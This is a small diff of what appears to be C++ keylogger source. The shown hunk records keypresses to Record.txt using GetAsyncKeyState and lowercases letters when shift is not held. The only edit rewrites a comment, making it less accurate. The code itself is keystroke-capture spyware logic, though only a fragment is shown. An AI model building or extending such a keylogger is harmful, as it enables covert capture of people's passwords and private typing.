@@ -27,7 +27,7 @@ void log()
 			{
 				ofstream write("Record.txt", ios::app);    // creating Record.txt file an openning it in append mode
 
-				if( (key>64) && (key<91) && !(GetAsyncKeyState(0x10)))    // checking for upper case without the shift key being pressed and converting it into lower case
+				if( (key>64) && (key<91) && !(GetAsyncKeyState(0x10)))    // checking for lower case
 				{
 					key+=32;
 					write << key;
